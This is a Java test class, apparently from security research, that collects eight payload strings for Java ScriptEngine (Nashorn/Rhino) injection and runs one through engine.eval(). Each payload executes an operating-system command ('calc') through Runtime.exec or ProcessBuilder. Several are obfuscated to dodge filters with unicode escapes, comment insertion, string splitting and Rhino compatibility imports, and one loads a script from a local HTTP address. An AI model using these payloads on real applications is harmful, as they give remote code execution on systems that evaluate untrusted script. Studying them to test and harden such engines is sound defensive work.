package shell.ScriptEngineManager;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

public class test {
    public static void main(String[] args) throws Exception{
        String test = "print('hello word!!');";
        String payload1 = "java.lang.Runtime.getRuntime().exec('calc');";
        String payload2 = "var a=exp();function exp(){var x=new java.lang.ProcessBuilder; x.command(\"calc\"); x.start();};";
        String payload3 = "var a=exp();function exp(){java.lang./****/Runtime./***/getRuntime().exec(\"calc\")};";
        String payload4 = "\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065.getRuntime().exec(\"calc\");";
        String payload5 = "var a= Java.type(\"java.lang\"+\".Runtime\"); var b =a.getRuntime();b.exec(\"calc\");";
        String payload6 = "load(\"nashorn:mozilla_compat.js\");importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\"calc\");";
        //兼容Rhino功能 https://blog.csdn.net/u013292493/article/details/51020057
        String payload7 = "var a =JavaImporter(java.lang); with(a){ var b=Runtime.getRuntime().exec(\"calc\");}";
        String payload8 = "var scr = document.createElement(\"script\");scr.src = \"http://127.0.0.1:8082/js.js\";document.body.appendChild(scr);exec();";
        eval(payload1);
    }
    public static void eval(String payload){
        payload=payload;
        ScriptEngineManager manager = new ScriptEngineManager(null);
        ScriptEngine engine = manager.getEngineByName("js");
        try {
            engine.eval(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}